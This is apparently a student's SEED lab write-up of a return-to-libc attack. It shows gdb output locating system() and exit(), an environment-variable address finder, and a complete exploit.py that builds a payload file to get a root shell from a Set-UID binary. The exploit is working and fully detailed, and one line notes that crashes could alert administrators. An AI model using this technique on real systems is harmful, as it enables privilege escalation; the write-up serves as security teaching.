# Return to Libc Lab
In this lab we are going to learn about return to libc attack with is a kind of BOF attack that can bypass the non-executable security measure.
The essence of the attack is to modify the return address of function to some static libraries that are loaded on to the memory and take control of the system from there on.

## Task 1
Here we debug the Set-UID `retlib` program using gdb to find out the address of two system functions `system()` and `exit()`:
```bash
seed@seed:~/Desktop/return-to-libc-lab$ make
gcc -m32 -DBUF_SIZE=439 -fno-stack-protector -z noexecstack -o retlib retlib.c
sudo chown root retlib && sudo chmod 4755 retlib
seed@seed:~/Desktop/return-to-libc-lab$ touch badfile
seed@seed:~/Desktop/return-to-libc-lab$ gdb -q retlib
Reading symbols from retlib...
(No debugging symbols found in retlib)
gdb-peda$ break main
Breakpoint 1 at 0x12f8
gdb-peda$ run
Starting program: /home/seed/Desktop/return-to-libc-lab/retlib 
[----------------------------------registers-----------------------------------]
EAX: 0xf7fb7808 --> 0xffffd33c --> 0xffffd4c8 ("SHELL=/bin/bash")
EBX: 0x0 
ECX: 0xafd93f22 
EDX: 0xffffd2c4 --> 0x0 
ESI: 0xf7fb5000 --> 0x1e6d6c 
EDI: 0xf7fb5000 --> 0x1e6d6c 
EBP: 0x0 
ESP: 0xffffd29c --> 0xf7decee5 (<__libc_start_main+245>:        add    esp,0x10)
EIP: 0x565562f8 (<main>:        endbr32)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562f3 <foo+58>: mov    ebx,DWORD PTR [ebp-0x4]
   0x565562f6 <foo+61>: leave  
   0x565562f7 <foo+62>: ret    
=> 0x565562f8 <main>:   endbr32 
   0x565562fc <main+4>: lea    ecx,[esp+0x4]
   0x56556300 <main+8>: and    esp,0xfffffff0
   0x56556303 <main+11>:        push   DWORD PTR [ecx-0x4]
   0x56556306 <main+14>:        push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xffffd29c --> 0xf7decee5 (<__libc_start_main+245>:       add    esp,0x10)
0004| 0xffffd2a0 --> 0x1 
0008| 0xffffd2a4 --> 0xffffd334 --> 0xffffd49b ("/home/seed/Desktop/return-to-libc-lab/retlib")
0012| 0xffffd2a8 --> 0xffffd33c --> 0xffffd4c8 ("SHELL=/bin/bash")
0016| 0xffffd2ac --> 0xffffd2c4 --> 0x0 
0020| 0xffffd2b0 --> 0xf7fb5000 --> 0x1e6d6c 
0024| 0xffffd2b4 --> 0xf7ffd000 --> 0x2bf24 
0028| 0xffffd2b8 --> 0xffffd318 --> 0xffffd334 --> 0xffffd49b ("/home/seed/Desktop/return-to-libc-lab/retlib")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x565562f8 in main ()
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e13420 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xf7e05f80 <exit>
gdb-peda$ 
```
as one can see **the address of `system()` is `0xf7e13420` and `exit()` is `0xf7e05f80`.**

## Task 2

We need a way to pass the `/bin/sh` string to the `system()` function. Here we are going to use environment variables. So we first define an environment variable
called `MYSHELL` and set it to `/bin/sh`. Now we need to know the address of this string. in Unix systems the `main()` function can have three arguments:

`int main(int argc, char* argv[], char* envp[])`

these are stored in the top of the stack. Now since our `retlib` program doesn't have any input arguments, the `argv` vector only contains the name of the program itself, and `envp` is a vector of strings with the format `variable_name=value`. Now we can write a program to get the address of `MYSHELL` and we can be sure that this address is the same, if we only set the length of the name of this program equal to the length of the `retlib`:


```c
// prtenv program:
#include <stdlib.h>
#include <stdio.h>

void main(){
    char* shell = getenv("MYSHELL");
    if (shell)
    printf("%x\n", (unsigned int)shell);
}
```

```bash
seed@seed:~/Desktop/return-to-libc-lab$ export MYSHELL=/bin/sh
seed@seed:~/Desktop/return-to-libc-lab$ env | grep MYSHELL
MYSHELL=/bin/sh
seed@seed:~/Desktop/return-to-libc-lab$ gcc -m32 -fno-stack-protector -z noexecstack -o prtenv ./prtenv.c 
seed@seed:~/Desktop/return-to-libc-lab$ ./prtenv 
ffffd50d
seed@seed:~/Desktop/return-to-libc-lab$ make
gcc -m32 -DBUF_SIZE=439 -fno-stack-protector -z noexecstack -o retlib retlib.c
sudo chown root retlib && sudo chmod 4755 retlib
seed@seed:~/Desktop/return-to-libc-lab$ ./retlib 
ffffd50d
Address of input[] inside main():  0xffffceec
Input size: 0
Address of buffer[] inside bof():  0xffffcd05
Frame Pointer value inside bof():  0xffffcec8
(^_^)(^_^) Returned Properly (^_^)(^_^)
seed@seed:~/Desktop/return-to-libc-lab$ gcc -m32 -fno-stack-protector -z noexecstack -o prtenv00 ./prtenv.c 
seed@seed:~/Desktop/return-to-libc-lab$ ./prtenv00 
ffffd509
seed@seed:~/Desktop/return-to-libc-lab$ python3
Python 3.8.10 (default, Jun  2 2021, 10:49:15) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x50d - 0x509
4
>>> 
[2]+  Stopped                 python3
```
so the `MYSHELL` variable is at `ffffd50d`. But look at how the address changed when we changed to program name; we added **two** characters to the name and the location got shifted by **four**!


## Task 3
Okay;  now that we know the address of `system()` and `exit()` and `/bin/bash` we are ready to attack. First we should change the return address of `bof()` to the address of `system()`, now when we return from `bof()` we need to track the `%esp` and `%ebp` registers to find out where we should put the address of `\bin\bash`.when `%eip` is at the beginning of `system()` function, `%esp` is above the `ret`. Now the machine will run the Prologue of the system function and the following happens:
1. `%esp` decrements by 4. So now `%esp` is pointing to where the return address of `bof()` was.
2. `%ebp` is set to the current value of `%esp`.
3. `%esp` is further moved down to make space for `system()` local variables.

Now the `system()` expects its one and only argument to be 8 bytes above the `%ebp`. So after all we have the below diagram:

|                        Stack(before)                         |                       Stack(after)                       |
| :----------------------------------------------------------: | :------------------------------------------------------: |
|                            empty                             | address of `/bin/bash` (the only argument of `system()`) |
|     address of input pointer (first argument of `bof()`)     |             the return address of `system()`             |
| `bof()` return address (which we change to  `system()` address) |               frame pointer of `system()`                |
|                    `bof()` frame pointer                     |           probably a local variable of system            |

Based on above we complete the `exploit.py` as below:

```python
buffer_addr = 0xffffcebd
ebp = 0xffffced8
sh_addr = 0xffffd50d       # The address of "/bin/sh"
system_addr = 0xf7e13420   # The address of system()
exit_addr = 0xf7e05f80     # The address of exit()


# Fill content with non-zero values
content = bytearray(0xaa for i in range(50))

X = ebp - buffer_addr + 12
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = ebp -buffer_addr + 4
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = ebp - buffer_addr + 8
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```
Now when we feed the `badfile` to `retlib` is gives us access to a root shell!
```bash
seed@seed:~/Desktop/return-to-libc-lab$ make clean
rm -f *.o *.out retlib  badfile
seed@seed:~/Desktop/return-to-libc-lab$ make
gcc -m32 -DBUF_SIZE=15 -fno-stack-protector -z noexecstack -o retlib retlib.c
sudo chown root retlib && sudo chmod 4755 retlib
seed@seed:~/Desktop/return-to-libc-lab$ ./exploit.py 
seed@seed:~/Desktop/return-to-libc-lab$ xxd badfile 
00000000: aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa  ................
00000010: aaaa aaaa aaaa aaaa aaaa aaaa aaaa aa20  ............... 
00000020: 34e1 f780 5fe0 f70d d5ff ffaa aaaa aaaa  4..._...........
00000030: aaaa                                     ..
seed@seed:~/Desktop/return-to-libc-lab$ ./retlib 
Address of input[] inside main():  0xffffcef0
Input size: 50
Address of buffer[] inside bof():  0xffffcebd
Frame Pointer value inside bof():  0xffffced8
# whoami
root
```

### Variation 1
Now lets see what would happen if we don't set the return address of `system` to `exit`:

``` bash
seed@seed:~/Desktop/return-to-libc-lab$ ./exploit.py 
seed@seed:~/Desktop/return-to-libc-lab$ ./retlib 
Address of input[] inside main():  0xffffcef0
Input size: 50
Address of buffer[] inside bof():  0xffffcebd
Frame Pointer value inside bof():  0xffffced8
# whoami
root
# exit
Segmentation fault (core dumped)
```
Since we didn't override the return address it's actually pointing to the `input[]` buffer which is part of the stack of `main()`, So we are saying after we close the root shell jump to stack and since we have no-executable-stack option set, we get a segmentation fault. Now one can say that we don't care since we have already had access to a root shell. But this unusual crashes of programs might get logged and  trigger a administrator to further review the matter.

### Variation 2
Now let's change the filename and see what would happen:
```bash
seed@seed:~/Desktop/return-to-libc-lab$ make
gcc -m32 -DBUF_SIZE=15 -fno-stack-protector -z noexecstack -o retlib retlib.c
sudo chown root retlib && sudo chmod 4755 retlib
seed@seed:~/Desktop/return-to-libc-lab$ mv ./retlib ./newretlib
seed@seed:~/Desktop/return-to-libc-lab$ ./exploit.py 
seed@seed:~/Desktop/return-to-libc-lab$ ./newretlib 
Address of input[] inside main():  0xffffcef0
Input size: 50
Address of buffer[] inside bof():  0xffffcebd
Frame Pointer value inside bof():  0xffffced8
zsh:1: command not found: h
Segmentation fault (core dumped)
```
Since we have changed the filename we have thus changed the location of `/bin/bash` string inside our address space, so the argument we are passing to the `system()` function is most probably a non-valid string and hence we get the error `zsh:1: command not found: h`.